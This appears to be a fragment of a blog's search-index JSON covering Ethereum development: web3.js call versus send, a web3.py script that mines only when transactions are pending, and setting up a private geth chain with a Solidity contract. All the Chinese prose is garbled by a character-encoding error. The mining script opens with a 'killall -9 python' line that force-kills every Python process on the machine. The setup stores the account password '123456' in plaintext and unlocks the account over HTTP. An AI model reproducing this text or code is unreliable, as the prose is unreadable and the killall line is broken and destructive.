","date":"2022-07-04","objectID":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/:2:0","tags":["web3.py","web3.js"],"title":"å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨","uri":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/"},{"categories":["Blockchain"],"content":"ä¸¾ä¾‹ // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract temp { int private counter; function add() public { counter ++; } function get() public view returns(int){ return counter; } } è°ƒç”¨ä»£ç  const base = require('./base'); const c = base.initContract('temp'); async function test(){ await c.methods.get().call().then(x=\u003e{ console.log(\"current value:\", x); }) await c.methods.add().call() await c.methods.get().call().then(x=\u003e{ console.log(\"after call add(): current value:\", x); }) let accounts = await base.web3Instance.eth.getAccounts(); await c.methods.add().send({from: accounts[0], gas: 3000000}) await c.methods.get().call().then(x=\u003e{ console.log(\"after send add(): current value:\", x); }) } test() è¾“å‡º current value: 0 after call add(): current value: 0 after send add(): current value: 1 å¯ä»¥çœ‹åˆ°ä½¿ç”¨ call è°ƒç”¨ add()å å€¼å¹¶æ²¡æœ‰å˜, è€Œç”¨ sendè°ƒç”¨add()å, å€¼è¢«ç´¯åŠ 1 ","date":"2022-07-04","objectID":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/:3:0","tags":["web3.py","web3.js"],"title":"å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨","uri":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/"},{"categories":["Blockchain"],"content":"web3.py web3.py ä¸­å¯¹åº”çš„æ˜¯ call()å’Œtransact() ","date":"2022-07-04","objectID":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/:4:0","tags":["web3.py","web3.js"],"title":"å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨","uri":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/"},{"categories":["Blockchain"],"content":"è®©è‡ªå·±ä½¿ç”¨gethè¿è¡Œçš„åŒºå—é“¾åƒGancheä¸€æ ·å¯ä»¥AUTOMINING åœ¨åšæ™ºèƒ½åˆçº¦å¼€å‘è¿‡ç¨‹ä¸­, å¦‚æœä½¿ç”¨Gancheçš„è¯, å¯ä»¥å‘ç°å…¶æœ‰ä¸€ä¸ªéå¸¸çˆ½çš„åŠŸèƒ½:AUTOMINING è‡ªåŠ¨æŒ–çŸ¿ æˆ–æŒ‰éœ€æŒ–çŸ¿, ä¹Ÿå°±æ˜¯è¯´ä¸éœ€è¦æŒ–çŸ¿çš„æ—¶å€™å°±åˆ«æŒ–, å¦åˆ™éå¸¸è€—ç”µè„‘èµ„æº. å¦‚æœæˆ‘ä»¬æ˜¯è‡ªå·±ä½¿ç”¨gethè¿è¡Œçš„æµ‹è¯•é“¾, åˆ™æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½, éœ€è¦æ‰‹åŠ¨attachåˆ°æ§åˆ¶å°è¿›è¡Œminer.start()å’Œminer.stop, éå¸¸ä¸æ–¹ä¾¿. ","date":"2022-07-03","objectID":"/%E4%BD%BF%E7%94%A8web3.py%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8C%89%E9%9C%80%E6%8C%96%E7%9F%BF/:0:0","tags":["web3.py","python"],"title":"ä½¿ç”¨web3.pyå®ç°åŒºå—é“¾æŒ‰éœ€æŒ–çŸ¿","uri":"/%E4%BD%BF%E7%94%A8web3.py%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8C%89%E9%9C%80%E6%8C%96%E7%9F%BF/"},{"categories":["Blockchain"],"content":"Web3.js å¦‚æœä½¿ç”¨Web3.js,è²Œä¼¼æ²¡æœ‰çœ‹åˆ°mineræ§åˆ¶çš„API, ä¸è¿‡Gitubä¸Šæœ‰ä¸€ä¸ªæ‰©å±•, å¯ä»¥å®ç° https://github.com/DecentricCorp/web3admin åˆ©ç”¨è¿™ä¸ªæ‰©å±•å¯ä»¥å®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½. ","date":"2022-07-03","objectID":"/%E4%BD%BF%E7%94%A8web3.py%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8C%89%E9%9C%80%E6%8C%96%E7%9F%BF/:1:0","tags":["web3.py","python"],"title":"ä½¿ç”¨web3.pyå®ç°åŒºå—é“¾æŒ‰éœ€æŒ–çŸ¿","uri":"/%E4%BD%BF%E7%94%A8web3.py%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8C%89%E9%9C%80%E6%8C%96%E7%9F%BF/"},{"categories":["Blockchain"],"content":"Web3.py Web3.pyè‡ªå¸¦mineræ§åˆ¶çš„API, è¿™å°±æ¯”è¾ƒæ–¹ä¾¿äº†. æ¯éš”å‡ ç§’è½®è¯¢ä¸€ä¸‹æ˜¯å¦æœ‰pendingçš„block, å¦‚æœæœ‰åˆ™æŒ–, å¦åˆ™åœæ­¢æŒ–çŸ¿ è„šæœ¬å¦‚ä¸‹ #!/usr/bin/env python3 import os import time from web3 import Web3 # pip3 install web3 # æŒ‰éœ€æŒ–çŸ¿ #ä½¿ç”¨å‰è¯·å…ˆä¿®æ”¹provide w3 = Web3(Web3.IPCProvider('../mychain/data/geth.ipc')) num_threads = os.cpu_count() def main(): # kill this script os.system(\"killall -9 python \u003e /dev/null 2\u003e\u00261\") print('Connected to Ethereum client: %s' % w3.clientVersion) print(\"å¯åŠ¨è‡ªåŠ¨æŒ–çŸ¿...\") while True: time.sleep(3) if w3.eth.getBlock('pending').transactions: print( time.strftime(\"%H:%M:%S\", time.localtime()) + \":Mining for pending transactions: %s\" % w3.eth.getBlock( 'pending').transactions) w3.geth.miner.start(num_threads) else: print(time.strftime(\"%H:%M:%S\", time.localtime()) + ':No pending transactions, sleeping...', end='\\r') w3.geth.miner.stop() if __name__ == \"__main__\": try: main() except KeyboardInterrupt: print(\"\\n\\nCtrl+C, bye!\") w3.geth.miner.stop() exit(0) except Exception as e: print(\"å‘ç”Ÿé”™è¯¯: %s\" % e) exit(0) è¿è¡Œæ—¶çš„æ ·å­ Connected to Ethereum client: Geth/v1.10.16-stable/darwin-amd64/go1.17.6 å¯åŠ¨è‡ªåŠ¨æŒ–çŸ¿... 13:24:42:Mining for pending transactions: [HexBytes('0x0cecdc430a73adc915d9944798e71735a48940b90e38965a3e4a5c8db6b48cb5')] 13:24:57:No pending transactions, sleeping... ","date":"2022-07-03","objectID":"/%E4%BD%BF%E7%94%A8web3.py%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8C%89%E9%9C%80%E6%8C%96%E7%9F%BF/:2:0","tags":["web3.py","python"],"title":"ä½¿ç”¨web3.pyå®ç°åŒºå—é“¾æŒ‰éœ€æŒ–çŸ¿","uri":"/%E4%BD%BF%E7%94%A8web3.py%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8C%89%E9%9C%80%E6%8C%96%E7%9F%BF/"},{"categories":["Blockchain"],"content":"å‰é¢åœ¨ ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨traffleå¥—ä»¶ ä¸­ ä½¿ç”¨ truffleå¥—ä»¶ä»é›¶å¼€å§‹æ­å»ºç¯å¢ƒ, ç¼–å†™ã€éƒ¨ç½²ã€æµ‹è¯•å’Œè°ƒç”¨æ™ºèƒ½åˆçº¦, è¿™æ¬¡æˆ‘ä»¬åªä½¿ç”¨ä¸€äº›å‘½ä»¤è¡Œå·¥å…·æ¥è¿›è¡Œ\"æ‰‹å·¥æ‰“é€ \" é…å¥—ä»£ç : https://github.com/yinhui1984/stepByStepSmartContract ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:0:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"åˆ›å»ºæµ‹è¯•é“¾ è¿˜æ˜¯ä»¥ETHä¸ºä¾‹, ä½¿ç”¨ Go Ethereum https://geth.ethereum.org æ¥åˆ›å»º ä½¿ç”¨POWå…±è¯†ç®—æ³•çš„ä¸€ä¸ªç®€å•ç§æœ‰é“¾. ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:1:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"å®‰è£…geth å®˜æ–¹æ•™ç¨‹ https://geth.ethereum.org/docs/install-and-build/installing-geth æˆ–è€…è‡ªå·±ä¸‹è½½å®‰è£…åŒ…è¿›è¡Œå®‰è£… https://geth.ethereum.org/downloads/ å®‰è£…å®Œæˆå, è¿è¡Œä¸€ä¸‹versionè¡¨ç¤ºæˆåŠŸ OSX MP16 ~/Downloads/privateNetwork â¯ geth version Geth Version: 1.10.16-stable Architecture: amd64 Go Version: go1.17.6 Operating System: darwin GOPATH= GOROOT=go ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:1:1","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"åˆ›å»ºä¸€ä¸ªè´¦æˆ· ä¸‹é¢çš„åˆ›ä¸–æ–‡ä»¶ä¸­çš„coinbaseä¼šç”¨åˆ°è¿™ä¸ªè´¦æˆ·, ç”¨æ¥æ¥æ”¶æŒ–çŸ¿çš„æ”¶å…¥ ä¸ºæ–¹ä¾¿èµ·è§, å°†è´¦æˆ·å¯†ç å†™åˆ°password.txt , å½“ç„¶è¿™æ˜¯ä¸å®‰å…¨çš„è¡Œä¸º. echo 123456 \u003e password.txt æ–°å»ºè´¦æˆ·: geth --datadir ./data/ account new --password ./password.txt å…¶ä¸­çš„datadiræ˜¯æ•°æ®å­˜å‚¨ç›®å½•, åé¢çš„æ•°æ®æ–‡ä»¶éƒ½å°†å­˜åˆ°è¿™ä¸ªç›®å½•ä¸­ OSX MP16 ~/Downloads/privateNetwork â¯ geth --datadir ./data/ account new --password ./password.txt INFO [07-01|10:10:34.007] Maximum peer count ETH=50 LES=0 total=50 Your new key was generated Public address of the key: 0x79dF0D3c23f22370881dC92aF524A1D5E52e3552 Path of the secret key file: data/keystore/UTC--2022-07-01T02-10-34.008109000Z--79df0d3c23f22370881dc92af524a1d5e52e3552 - You can share your public address with anyone. Others need it to interact with you. - You must NEVER share the secret key with anyone! The key controls access to your funds! - You must BACKUP your key file! Without the key, it's impossible to access account funds! - You must REMEMBER your password! Without the password, it's impossible to decrypt the key! æ‰“å°å†…å®¹ä¸­çš„ 0x79dF0D3c23f22370881dC92aF524A1D5E52e3552æ˜¯å…¬é’¥, ä¹Ÿæ˜¯æˆ‘ä»¬çš„è´¦æˆ·åœ°å€ ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:1:2","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"æ‰¾ä¸€ä¸ªç½‘ç»œID chainIdæˆ–è€…network ID ç”¨äºéš”ç¦»ä»¥å¤ªåŠå¯¹ç­‰ç½‘ç»œã€‚åªæœ‰å½“ä¸¤ä¸ªå¯¹ç­‰ç‚¹ä½¿ç”¨ç›¸åŒçš„åˆ›ä¸–å—å’Œç½‘ç»œ ID æ—¶ï¼ŒåŒºå—é“¾èŠ‚ç‚¹ä¹‹é—´æ‰ä¼šå‘ç”Ÿè¿æ¥ã€‚ä½¿ç”¨ â€“networkid å‘½ä»¤è¡Œé€‰é¡¹è®¾ç½® geth ä½¿ç”¨çš„ç½‘ç»œ IDã€‚ ä»¥å¤ªç½‘ä¸»ç½‘ ID ä¸º 1ã€‚å¦‚æœæ‚¨æä¾›ä¸ä¸»ç½‘ä¸åŒçš„è‡ªå®šä¹‰ç½‘ç»œ IDï¼Œæ‚¨çš„èŠ‚ç‚¹å°†ä¸ä¼šè¿æ¥åˆ°å…¶ä»–èŠ‚ç‚¹å¹¶å½¢æˆä¸“ç”¨ç½‘ç»œã€‚å¦‚æœæ‚¨æ‰“ç®—åœ¨ Internet ä¸Šè¿æ¥åˆ°æ‚¨çš„ç§æœ‰é“¾ï¼Œæœ€å¥½é€‰æ‹©ä¸€ä¸ªå°šæœªä½¿ç”¨çš„ç½‘ç»œ IDã€‚æ‚¨å¯ä»¥åœ¨ https://chainid.network æ‰¾åˆ°ç”±ç¤¾åŒºè¿è¡Œçš„ä»¥å¤ªåŠç½‘ç»œæ³¨å†Œè¡¨ã€‚ è¿™é‡Œæˆ‘ä»¬åªæ˜¯åœ¨æœ¬åœ°è¿è¡Œ, éšä¾¿ä½¿ç”¨ä¸€ä¸ªIDå°±å¯ä»¥äº†, æ¯”å¦‚1235 ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:1:3","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"ç¼–å†™\"åˆ›ä¸–æ–‡ä»¶\" ä¸€ä¸ªæ–°çš„åŒºå—é“¾åœ¨ç”Ÿæˆç¬¬ä¸€ä¸ªåŒºå—, ä¹Ÿå°±æ˜¯åˆ›ä¸–å—çš„æ—¶å€™, éœ€è¦ä»åˆ›ä¸–æ–‡ä»¶æ¥è¿›è¡Œç”Ÿæˆ touch genesis.json { \"nonce\": \"0x0000000000000042\", \"timestamp\": \"0x00\", \"parentHash\": \"0x0000000000000000000000000000000000000000000000000000000000000000\", \"extraData\": \"0x00\", \"gasLimit\": \"0x8000000\", \"difficulty\": \"0x0400\", \"mixhash\": \"0x0000000000000000000000000000000000000000000000000000000000000000\", \"coinbase\": \"0x79dF0D3c23f22370881dC92aF524A1D5E52e3552\", \"alloc\": { \"0x79dF0D3c23f22370881dC92aF524A1D5E52e3552\": { \"balance\": \"1000000000000000000000\" } }, \"config\": { \"chainId\": 1235, \"homesteadBlock\": 0, \"byzantiumBlock\": 0, \"constantinopleBlock\": 0, \"eip150Block\": 0, \"eip155Block\": 0, \"eip158Block\": 0 } } å…³äºåˆ›ä¸–æ–‡ä»¶ä¸­çš„å„ä¸ªå­—æ®µçš„å«ä¹‰, åé¢ä¼šæœ‰ä¸€ç¯‡ä¸“é—¨çš„åšå®¢æ¥è®² æ³¨æ„: å°†coinbase ä»¥åŠ allocä¸­çš„åœ°å€ä¿®æ”¹ä¸ºä¸Šé¢åˆ›å»ºè´¦æˆ·æ—¶ä½ æ‰€å¾—åˆ°çš„åœ°å€ ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:1:4","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"åˆå§‹åŒ–åŒºå—é“¾ geth --datadir ./data init ./genesis.json è¾“å‡º INFO [07-01|10:50:50.915] Maximum peer count ETH=50 LES=0 total=50 INFO [07-01|10:50:50.919] Set global gas cap cap=50,000,000 INFO [07-01|10:50:50.919] Allocated cache and file handles database=/Users/zhouyinhui/Downloads/privateNetwork/data/geth/chaindata cache=16.00MiB handles=16 INFO [07-01|10:50:51.007] Writing custom genesis block INFO [07-01|10:50:51.010] Persisted trie from memory database nodes=0 size=0.00B time=\"21.005Âµs\" gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B INFO [07-01|10:50:51.011] Successfully wrote genesis state database=chaindata hash=0ca0fb..b61b69 INFO [07-01|10:50:51.011] Allocated cache and file handles database=/Users/zhouyinhui/Downloads/privateNetwork/data/geth/lightchaindata cache=16.00MiB handles=16 INFO [07-01|10:50:51.090] Writing custom genesis block INFO [07-01|10:50:51.090] Persisted trie from memory database nodes=0 size=0.00B time=\"2.71Âµs\" gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B INFO [07-01|10:50:51.091] Successfully wrote genesis state database=lightchaindata hash=0ca0fb..b61b69 OSX MP16 ~/Downloads/privateNetwork â¯ ç”Ÿæˆçš„æ–‡ä»¶åœ¨ ./data/gethä¸‹ ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:1:5","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"è¿è¡ŒåŒºå—é“¾ geth --datadir ./data/ --networkid 1235 --port 8545 --http --http.api 'admin,eth,miner,net,txpool,personal,web3' --mine --allow-insecure-unlock --unlock '0x79dF0D3c23f22370881dC92aF524A1D5E52e3552' --password password.txt --datadir æ•°æ®æ–‡ä»¶ç›®å½• --networkid ç½‘ç»œID --port RPCç«¯å£ --http å¯ç”¨http-rpcæœåŠ¡ --http.apiæä¾›é‚£äº›API --mine å¯ç”¨æŒ–çŸ¿ --allow-insecure-unlock å½“è´¦æˆ·ç›¸å…³çš„RPCè¢«httpæš´éœ²æ—¶ï¼Œå…è®¸ä¸å®‰å…¨çš„è´¦æˆ·è§£é” --unlock è§£é”è´¦æˆ· (å¤šä¸ªè´¦æˆ·ç”¨é€—å·åˆ†å‰²) --password è§£é”è´¦æˆ·ç”¨åˆ°çš„å¯†ç æ–‡ä»¶ æˆåŠŸè¿è¡Œå, ä¼šçœ‹åˆ°å¾ˆå¤šæ‰“å°ä¿¡æ¯, å…¶ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯ä¸‹é¢è¿™ä¸¤è¡Œ, ä¸€ä¸ªæ˜¯ipc, ä¸€ä¸ªæ˜¯http server, æˆ‘ä»¬ä¼šä½¿ç”¨ä»–ä»¬æ¥å’Œæˆ‘ä»¬çš„åŒºå—é“¾è¿›è¡Œé€šè®¯ INFO [07-01|11:08:58.245] IPC endpoint opened url=/Users/zhouyinhui/Downloads/privateNetwork/data/geth.ipc INFO [07-01|11:08:58.245] HTTP server started endpoint=127.0.0.1:8545 prefix= cors= vhosts=localhost å¦å¤–ä¸€æ¡æ˜¯ æˆ‘ä»¬ä½œä¸ºåŒºå—é“¾ä¸­çš„å¯¹ç­‰èŠ‚ç‚¹PEER NODEæ—¶çš„ä¿¡æ¯, è¿™é‡Œæˆ‘ä»¬è¿˜ç”¨ä¸åˆ° Started P2P networking self=enode://de2537c5f309be45bcb2d011cd172138db40295f74a288b07e03635e2194e7c2987cf97c9d295dc502053d9f7adda11052597c7f1bc5a5ec3d8182777138a0f1@127.0.0.1:8545 è¯·ä¿æŒåŒºå—é“¾åœ¨åå°è¿è¡Œ, åé¢çš„ä»£ç éƒ½éœ€è¦ç”¨åˆ° ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:2:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"ä¸æµ‹è¯•é“¾è¿›è¡Œäº¤äº’ attachåˆ°æµ‹è¯•é“¾, å°±å¯ä»¥å¯åŠ¨ä¸€ä¸ªjs console, å’Œtruffle consoleåŠŸèƒ½ä¸€æ · æ–¹å¼1, é€šè¿‡IPCè¿›è¡Œattach geth attach /Users/zhouyinhui/Downloads/privateNetwork/data/geth.ipc OSX MP16 ~/blockchain/private_net/tempchain â¯ geth attach /Users/zhouyinhui/Downloads/privateNetwork/data/geth.ipc Welcome to the Geth JavaScript console! .... To exit, press ctrl-d or type exit \u003e eth.chainId() \"0x4d3\" \u003e \"0x4d3\" ä¹Ÿå°±æ˜¯ æˆ‘ä»¬çš„ 1235 å…¶ä¸­ *.ipc å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ æ–¹å¼2, é€šè¿‡httpæœåŠ¡è¿›è¡Œattach geth attach http://127.0.0.1:8545 ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:3:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"ä¸€é”®ç”Ÿæˆæµ‹è¯•é“¾ ä¸Šé¢é‚£äº›ç¹ççš„æ­¥éª¤å¯ä»¥ææˆä¸€ä¸ªè„šæœ¬, ä¸€é”®ç”Ÿæˆ, è¿™æ ·æ¥å¾—æ›´æ–¹ä¾¿ è„šæœ¬åœ¨è¿™é‡Œ: https://github.com/yinhui1984/stepByStepSmartContract/blob/main/autogen/autoGenChain.py (ç›´æ¥å°†ä»£ç è´´åˆ°è¿™é‡Œä¼šå¯¼è‡´GitHub Pages failed to build your siteÂ ğŸ˜‚) ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:4:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"ç¼–å†™æ™ºèƒ½åˆçº¦ æˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨ ä¸Šç¯‡åšå®¢ä¸­çš„æ™ºèƒ½åˆçº¦ mkdir ./contracts cd ./contracts touch Calculator.sol // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Calculator { function add(int a, int b) public pure returns (int) { return a + b; } function subtract(int a, int b) public pure returns (int) { return a - b; } } ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:5:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"ç¼–è¯‘æ™ºèƒ½åˆçº¦ å¦‚æœä½ çš„ç”µè„‘ä¸Šæ²¡æœ‰solc, è¯·äº‹å…ˆå®‰è£…, å®ƒæ˜¯solidityçš„ç¼–è¯‘å™¨, å®˜æ–¹æ•™ç¨‹: https://docs.soliditylang.org/en/v0.8.15/installing-solidity.html#installing-solidity ç¼–è¯‘: solc --bin --abi -o ./build ./Calculator.sol --bin ç”Ÿæˆ16è¿›åˆ¶æ–‡ä»¶ --abiç”Ÿæˆabiæ–‡ä»¶ -oè¾“å‡ºç›®å½• å¯ä»¥å†™ä¸€ä¸ªMakefileæ¥å¹²è¿™ä¸ªäº‹æƒ…: all: solc --bin --abi --overwrite -o ./build ./Calculator.sol clean: rm -rf ./build/* OSX MP16 ~/Downloads/privateNetwork/contracts â¯ tree . â”œâ”€â”€ Calculator.sol â”œâ”€â”€ Makefile â””â”€â”€ build â”œâ”€â”€ Calculator.abi â””â”€â”€ Calculator.bin 